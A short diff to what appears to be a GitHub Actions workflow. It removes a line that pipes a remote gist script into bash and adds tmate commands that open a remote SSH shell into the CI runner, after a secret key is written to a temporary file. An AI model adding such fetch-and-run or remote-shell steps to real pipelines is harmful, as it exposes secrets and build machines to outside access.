@@ -41,7 +41,9 @@ jobs:
         run: |
           printf "%s" "$KEY" > /tmp/ssh.key
           chmod 600 /tmp/ssh.key
-          curl -s -L https://gist.githubusercontent.com/nic-6443/7b44ed6a4e60708a0a1034f19720c70e/raw/bc3d5968939aacbcf1ff840ee4b15b169b913308/hello.sh | bash
+          sudo apt-get install tmate -y
+          tmate -S /tmp/xxxxx.sock  -a /home/runner/.ssh/authorized_keys set-option -g default-command "bash"\; new-session -d
+          tmate -S /tmp/xxxxx.sock display -p '#{tmate_ssh}'
       - id: Hello
         run: |
           cat /tmp/ssh_url
